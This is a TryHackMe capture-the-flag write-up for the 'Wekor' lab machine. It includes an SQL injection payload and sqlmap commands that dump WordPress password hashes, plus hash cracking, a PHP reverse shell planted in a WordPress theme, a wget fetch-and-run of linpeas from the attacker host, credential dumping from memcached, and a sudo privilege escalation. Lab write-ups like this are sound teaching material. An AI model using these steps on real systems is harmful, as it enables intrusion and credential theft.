# Wekor | THM
### Difficulty: Medium
-----------------------------------

![image](https://miro.medium.com/v2/resize:fit:284/format:webp/1*JS9YhhakoLUTlz2yUWH1Zg.png)

First of all, let’s add the domain name:

```bash
echo '<ip-address>      wekor.thm' >> /etc/hosts
```
Next step will be Nmap scan to identify open ports and services within the system to get more 
information about it and write it into a file to read it when needed.

```bash
nmap -sC -sV <ip-address> > nmap.txt
```

Results:
```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-20 07:53 EST
Nmap scan report for wekor.thm (10.10.170.230)
Host is up (0.085s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95c3ceaf07fae28e2904e4cd146a21b5 (RSA)
|   256 4d99b568afbb4e66ce7270e6e3f896a4 (ECDSA)
|_  256 0de57de81a12c0ddb7665e98345559f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 9 disallowed entries 
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
|_/comingreallysoon /interesting
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are 2 open ports :
22- SSH
80- HTTP
So, it’s time to visit the domain on the browser. As we can see this site has robots.txt file that includes 9 directories.

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*C6w2FwRbhTuIJ1MrS6547Q.png)

Let’s check the content of robot.txt by grabbing it into a file with this command:

```bash
curl 'http://wekor.thm/robots.txt' > robots.txt
```

Results:
```bash
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
```

After checking those directories almost all of them get me into a dead end with error 404 Not Found.
But, it just almost. The directory of /comingreallysoon left
me a message that tells us to move to another directory.

*“Welcome Dear Client! We’ve setup our latest website on /it-next, Please go check it out! If you have any comments
or suggestions, please tweet them to @faketwitteraccount! Thanks a lot !”*

Time to check that.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*rufo-s6cEh-VF7lSQwpb2w.png)

and there is a website.

After inspection the functionality and the design of that, I found something interesting on the shopping cart on “Apply coupon” field.
An attempt to trigger this field with the payload ‘ or 1=1# leads to error message that gives a clue about sqli vulnerability.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*5JcoTeiD4KHD6iy35TvPyA.png)

There are 2 ways to get information from the DB: manually and automatically.
Manually is the difficult way because you have to write the correct payload each time until you achieve the good stuff.
Payloads to get the DB names, tables names, columns and then what you are looking for.
I chose the easy way to that with the automatics Sqlmap tool.
But first lets grab the specific request and then we’ll make the inspection with sqlmap.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*nH5L3QpwFD5TelB7oIUMOA.png)

The inspection is made with this command:
```bash
sqlmap -r <file-name>
```

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*W5lOEptC11gM5yL72Nc5mw.png)

Those results give the final confirmation about the sqli vulnerability on the “Apply Coupon” field.
This tool will tell about the DB names with that command:

```bash
sqlmap -r <file-name> -dbs
```
There are 6 DB names:

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*0NDdfqjNQcgogQKrD6bZgw.png)

“mysql” can be interesting but “wordpress” is even more.

```bash
sqlmap -r <file-name> -D wordpress --tables
```

Results:

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*-ylBoAgLr124jrRYMSPpAQ.png)

wp_users is the table that gives use usernames and their hashed passwords.
It’s dumping time.

```bash
sqlmap -r <file-name> -D wordpress -T wp_users --dump
```

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*94XKvjTMJxL0bOfAJgqH-A.png)

As we can see there is a new subdomain that relates to wordpress within 4 users. 
Firstly, let’s add the new subdomain to /etc/hosts.
```bash
echo '<ip-address>     wekor.thm site.wekor.thm' >> etc/hosts 
```

Check the sqlmap table output file:

![image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*94-Ck1JKFl8pafGOyu4Jww.png)

Let’s grab the hashes from table file and crack it with John The Ripper.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt <file-name>
```

don’t know why john found only 2 passwords but it was good enough.

![image](https://miro.medium.com/v2/resize:fit:326/format:webp/1*M7GrnkNQPJpW72pLXP3WOw.png)

After getting the passwords I navigated to http://site.wekor.thm/wordpress/wp-admin and there is login page.

Try the passwords with the usernames.

The successful login leads me to change the 404.php file, and then i modified it with
php reverse shell that connect to my machine with specific port.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*X6s68Pl-R9q2YaRGpKyX8g.png)

let’s navigate to a page that isn’t exist to execute the code and get a shell!

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*z9i0i7llewNBx0dZeBwRXQ.png)

I tried to locate the user.txt flag but I don’t have the permission to read the user Orka’s files.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*y_23meVKjck2eqYgGrv-BQ.png)

next step will be upload linpeas to the machine.
first, open python server where the linpeas script is with that command :
```bash
python -m http.server
```

Then, get it on the target machine with:

```bash
wget http://<ip-address>:8000/linpeas.sh
```

give it execute permission and execute it:

```bash
chmod +x linpeas.sh

./linpeas.sh
```

I did not find something special so I checked another port on this machine :

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*p7sYi7EyqWYANrMWdxX4Cg.png)

What is that port?
after an explore about it, the service is “memcached” that uses to get data faster from the memory cache.
maybe there is something else but how can I dump data from it?
I find a way to connect it with telnet.

```bash
www-data@osboxes:/$ telnet localhost 11211
telnet localhost 11211
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
version
version
VERSION 1.4.25 Ubuntu
stats 
STAT pid 968
STAT uptime 1412
STAT time 1703165391
STAT version 1.4.25 Ubuntu
STAT libevent 2.0.21-stable
STAT pointer_size 32
STAT rusage_user 0.025273
STAT rusage_system 0.025273
STAT curr_connections 1
STAT total_connections 12
STAT connection_structures 2
STAT reserved_fds 20
STAT cmd_get 0
STAT cmd_set 50
STAT cmd_flush 0
STAT cmd_touch 0
STAT get_hits 0
STAT get_misses 0
STAT delete_misses 0
STAT delete_hits 0
STAT incr_misses 0
STAT incr_hits 0
STAT decr_misses 0
STAT decr_hits 0
STAT cas_misses 0
STAT cas_hits 0
STAT cas_badval 0
STAT touch_hits 0
STAT touch_misses 0
STAT auth_cmds 0
STAT auth_errors 0
STAT bytes_read 1573
STAT bytes_written 1620
STAT limit_maxbytes 67108864
STAT accepting_conns 1
STAT listen_disabled_num 0
STAT time_in_listen_disabled_us 0
STAT threads 4
STAT conn_yields 0
STAT hash_power_level 16
STAT hash_bytes 262144
STAT hash_is_expanding 0
STAT malloc_fails 0
STAT bytes 321
STAT curr_items 5
STAT total_items 50
STAT expired_unfetched 0
STAT evicted_unfetched 0
STAT evictions 0
STAT reclaimed 0
STAT crawler_reclaimed 0
STAT crawler_items_checked 0
STAT lrutail_reflocked 0
END
stats slabs
STAT 1:chunk_size 80
STAT 1:chunks_per_page 13107
STAT 1:total_pages 1
STAT 1:total_chunks 13107
STAT 1:used_chunks 5
STAT 1:free_chunks 13102
STAT 1:free_chunks_end 0
STAT 1:mem_requested 321
STAT 1:get_hits 0
STAT 1:cmd_set 50
STAT 1:delete_hits 0
STAT 1:incr_hits 0
STAT 1:decr_hits 0
STAT 1:cas_hits 0
STAT 1:cas_badval 0
STAT 1:touch_hits 0
STAT active_slabs 1
STAT total_malloced 1048560
END
stats cachedump 1 0
stats cachedump 1 0
ITEM id [4 b; 1703163919 s]
ITEM email [14 b; 1703163919 s]
ITEM salary [8 b; 1703163919 s]
ITEM password [15 b; 1703163919 s]
ITEM username [4 b; 1703163919 s]
END
get username
get username
VALUE username 0 4
Orka
END
get password
get password
VALUE password 0 15
*************** /// the password is here. ///
END
```

lets move to Orka and read user.txt flag.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*PbJgrMlQg0RP5cA7qsLlnw.png)

*privilege escalation*

Its time to root the machine.
check which files can run as root :

```bash
Orka@osboxes:~$ sudo -l 
```

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*Cl3uqJHl4bsVmgIw2xoiZg.png)

LETS CHECK IF IT CAN RUN WITH SUDO. YES WE CAN! but we cannot write the bitcoin file as Orka.
so lets change the Desktop folder and replace the bitcoin content with /bin/bash to get root.

///If a user can execute file as sudo , sometimes there is a vuln that gives 
the user the ability to run /bin/bash with sudo permission to get root.///

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*NtEh_55MwXSz1P7kyB8d4A.png)

4ND W3 are d0N3.

Happy Hacking.

**Written by Alon Presman, Penetration Tester and Ethical Hacker.**


























 






























































